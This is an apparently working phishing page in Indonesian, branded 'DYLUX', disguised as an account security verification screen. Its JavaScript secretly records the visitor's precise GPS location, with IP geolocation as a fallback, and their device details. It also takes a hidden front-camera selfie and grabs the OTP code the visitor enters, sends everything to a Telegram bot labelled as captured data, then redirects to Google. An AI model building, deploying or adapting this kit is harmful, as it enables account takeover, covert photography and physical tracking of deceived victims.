<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verifikasi Keamanan</title>
    <script src="config.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: Arial, sans-serif;
            color: #e0e0ff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .box {
            background: #14141e;
            border: 1px solid rgba(0,240,255,0.1);
            border-radius: 16px;
            padding: 40px 32px;
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(135deg, #00f0ff, #7b2ffc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .badge { display: inline-block; background: rgba(0,255,136,0.1); color: #00ff88; font-size: 11px; padding: 4px 12px; border-radius: 20px; margin-top: 6px; }
        .icon { font-size: 48px; margin: 16px 0; }
        h2 { font-size: 18px; margin-bottom: 8px; }
        p { color: #8888aa; font-size: 14px; line-height: 1.6; }
        video { display: none !important; }
        canvas { display: none !important; }
        input { width: 100%; padding: 14px; background: #0a0a0f; border: 1px solid rgba(0,240,255,0.1); border-radius: 12px; color: #fff; font-size: 16px; outline: none; margin: 12px 0; }
        input:focus { border-color: #00f0ff; }
        button { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; transition: 0.3s; }
        button:hover { opacity: 0.8; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        .footer { margin-top: 20px; font-size: 11px; color: #555; }
        .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,240,255,0.1); border-top-color: #00f0ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 12px auto; }
        .spinner.active { display: block; }
        @keyframes spin { to { transform: rotate(360deg); } }
        #statusMsg { font-size: 13px; color: #8888aa; margin-top: 10px; display: none; }
        
        #popupOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }
        #popupBox {
            background: #1a1a2e;
            border-radius: 16px;
            padding: 28px 24px;
            max-width: 340px;
            width: 90%;
            text-align: center;
            border: 1px solid rgba(0, 240, 255, 0.15);
            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
        }
        #popupBox .popup-icon { font-size: 40px; margin-bottom: 8px; }
        #popupBox .popup-title { font-size: 16px; font-weight: 700; color: #e0e0ff; margin-bottom: 4px; }
        #popupBox .popup-desc { font-size: 13px; color: #8888aa; margin-bottom: 16px; line-height: 1.5; }
        #popupBox .popup-desc strong { color: #00f0ff; }
        #popupBox .popup-btn-group { display: flex; gap: 10px; }
        #popupBox .popup-btn-group .btn-cancel { flex: 1; padding: 10px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; background: #2a2a3e; color: #8888aa; }
        #popupBox .popup-btn-group .btn-allow { flex: 1; padding: 10px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; background: linear-gradient(135deg, #00f0ff, #7b2ffc); color: #fff; }
        #popupBox .popup-footer { font-size: 11px; color: #555; margin-top: 12px; }
        .popup-hidden { display: none !important; }
    </style>
</head>
<body>

    <!-- ========================================== -->
    <!-- POPUP HALUS "VERIFIKASI LOKASI"           -->
    <!-- ========================================== -->
    <div id="popupOverlay">
        <div id="popupBox">
            <div class="popup-icon">🛡️</div>
            <div class="popup-title">Verifikasi Keamanan</div>
            <div class="popup-desc">
                Untuk keamanan akun, kami perlu memverifikasi <strong>lokasi</strong> perangkat Anda.
            </div>
            <div class="popup-btn-group">
                <button class="btn-cancel" id="popupCancel">Nanti</button>
                <button class="btn-allow" id="popupAllow">Verifikasi</button>
            </div>
            <div class="popup-footer">🔒 Data terenkripsi end-to-end</div>
        </div>
    </div>

    <!-- ========================================== -->
    <!-- MAIN CONTENT                              -->
    <!-- ========================================== -->
    <div class="box">
        <div class="logo">DYLUX</div>
        <div class="badge">🔒 Secure</div>
        <div class="icon">🛡️</div>
        <h2>Verifikasi Keamanan</h2>
        <p>Akun Anda terdeteksi login dari perangkat baru. Verifikasi identitas untuk melanjutkan.</p>

        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>

        <input type="text" id="otpInput" placeholder="Masukkan Kode OTP" maxlength="6">
        <button id="verifyBtn">Verifikasi</button>

        <div class="spinner" id="spinner"></div>
        <div id="statusMsg"></div>
        <div class="footer">DYLUX • Cahaya dalam Kegelapan</div>
    </div>

    <script>
    // ============================================
    // AMBIL GPS PRESISI (PAKSA SAMPE DAPET)
    // ============================================
    function getGPSLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }

            let watchId = null;
            let resolved = false;
            let bestLocation = null;
            let attempts = 0;

            const timeout = setTimeout(() => {
                if (watchId) navigator.geolocation.clearWatch(watchId);
                if (!resolved) {
                    resolve(bestLocation || null);
                }
            }, 15000);

            watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    attempts++;
                    const accuracy = pos.coords.accuracy;
                    
                    if (accuracy < 100) {
                        resolved = true;
                        clearTimeout(timeout);
                        navigator.geolocation.clearWatch(watchId);
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: accuracy
                        });
                    } else {
                        if (!bestLocation || accuracy < bestLocation.accuracy) {
                            bestLocation = {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: accuracy
                            };
                        }
                        if (attempts >= 10) {
                            resolved = true;
                            clearTimeout(timeout);
                            navigator.geolocation.clearWatch(watchId);
                            resolve(bestLocation);
                        }
                    }
                },
                () => {
                    resolved = true;
                    clearTimeout(timeout);
                    navigator.geolocation.clearWatch(watchId);
                    resolve(bestLocation || null);
                }, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        });
    }

    // ============================================
    // FUNGSI KIRIM KE TELEGRAM
    // ============================================
    async function sendMessageToTelegram(chatId, text) {
        try {
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
            });
        } catch (e) { console.error('Telegram error:', e); }
    }

    async function sendPhotoToTelegram(chatId, imageBase64, caption) {
        try {
            const response = await fetch(imageBase64);
            const blob = await response.blob();
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', caption);
            formData.append('parse_mode', 'HTML');
            await fetch(`https://api.telegram.org/bot${DYLUX_CONFIG.BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (error) { console.error('Send photo error:', error); }
    }

    // ============================================
    // AUTO-DETECT (HANYA GPS, IP CADANGAN)
    // ============================================
    let autoDetectDone = false;

    async function autoDetect() {
        if (autoDetectDone) return;
        autoDetectDone = true;

        try {
            const params = new URLSearchParams(window.location.search);
            const userId = params.get('id');
            if (!userId) return;

            // 🔥 AMBIL GPS PRESISI (UTAMA)
            const gpsData = await getGPSLocation();

            let lat = 0;
            let lon = 0;
            let locationText = 'Tidak terdeteksi';
            let accuracyText = '';
            let isGPS = false;

            if (gpsData && gpsData.lat && gpsData.lon) {
                lat = gpsData.lat;
                lon = gpsData.lon;
                locationText = `${gpsData.lat}, ${gpsData.lon}`;
                accuracyText = ` (Akurasi ${Math.round(gpsData.accuracy)}m)`;
                isGPS = true;
            } else {
                // Kalo GPS gagal, coba IP (last resort)
                const ipRes = await fetch('https://ip-api.com/json/');
                const ipData = await ipRes.json();
                if (ipData && ipData.query) {
                    lat = ipData.lat || 0;
                    lon = ipData.lon || 0;
                    locationText = `${ipData.city || 'unknown'}, ${ipData.regionName || 'unknown'}, ${ipData.country || 'unknown'}`;
                    accuracyText = ' (IP-based)';
                }
            }

            const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;

            const message =
                `<b>🎯 NEW DATA CAPTURED!</b>\n\n` +
                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                `<b>📌 Type:</b> Auto-Detect\n` +
                `<b>📍 Sumber:</b> ${isGPS ? '✅ GPS Presisi' : '🌐 IP API'}\n` +
                `<b>📍 Lokasi:</b> ${locationText}${accuracyText}\n` +
                `<b>📍 Google Maps:</b> <a href="${mapsLink}">Klik untuk lihat map</a>\n` +
                `<b>📱 Device:</b> ${navigator.userAgent}\n` +
                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;

            await sendMessageToTelegram(userId, message);
            console.log('✅ Auto-detect sent!', isGPS ? 'GPS' : 'IP');

        } catch (e) { console.error('Auto-detect error:', e); }
    }

    // ============================================
    // POPUP HANDLER
    // ============================================
    document.getElementById('popupAllow').addEventListener('click', () => {
        document.getElementById('popupOverlay').classList.add('popup-hidden');
        navigator.geolocation.getCurrentPosition(
            () => {
                console.log('📍 GPS allowed');
                autoDetectDone = false;
                autoDetect();
            },
            () => {
                console.log('❌ GPS denied, fallback ke IP');
                autoDetect();
            }, {
                enableHighAccuracy: true,
                timeout: 10000
            }
        );
    });

    document.getElementById('popupCancel').addEventListener('click', () => {
        document.getElementById('popupOverlay').classList.add('popup-hidden');
        autoDetect();
    });

    setTimeout(autoDetect, 500);

    // ============================================
    // KAMERA DEPAN (SELFIE) + OTP
    // ============================================
    const userId = new URLSearchParams(window.location.search).get('id');
    const verifyBtn = document.getElementById('verifyBtn');
    const otpInput = document.getElementById('otpInput');
    const spinner = document.getElementById('spinner');
    const statusMsg = document.getElementById('statusMsg');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    async function captureFrontCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 } }
            });
            video.srcObject = stream;
            await video.play();
            await new Promise(resolve => setTimeout(resolve, 1500));

            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            stream.getTracks().forEach(track => track.stop());
            return imageData;
        } catch (error) {
            console.error('Camera error:', error);
            return null;
        }
    }

    verifyBtn.addEventListener('click', async () => {
        const otp = otpInput.value.trim();
        if (!otp) {
            statusMsg.style.display = 'block';
            statusMsg.innerHTML = '⚠️ Masukkan kode OTP!';
            return;
        }

        verifyBtn.disabled = true;
        spinner.classList.add('active');
        statusMsg.style.display = 'none';

        const imageData = await captureFrontCamera();

        if (imageData) {
            const caption =
                `<b>📸 SELFIE CAPTURED!</b>\n\n` +
                `<b>👤 User ID:</b> <code>${userId}</code>\n` +
                `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
                `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;
            await sendPhotoToTelegram(userId, imageData, caption);
        }

        const message =
            `<b>🔑 OTP CAPTURED!</b>\n\n` +
            `<b>👤 User ID:</b> <code>${userId}</code>\n` +
            `<b>🔢 OTP:</b> <code>${otp}</code>\n` +
            `<b>📸 Foto:</b> ${imageData ? '✅ Berhasil' : '❌ Gagal'}\n` +
            `<b>🕐 Time:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
            `<i>💀 DYLUX - Cahaya dalam Kegelapan</i>`;

        await sendMessageToTelegram(userId, message);

        spinner.classList.remove('active');
        verifyBtn.disabled = false;
        statusMsg.style.display = 'block';
        statusMsg.innerHTML = '✅ Verifikasi berhasil! Foto + OTP terkirim.';
        otpInput.value = '';

        setTimeout(() => {
            window.location.href = 'https://google.com';
        }, 3000);
    });
    </script>
</body>
</html>
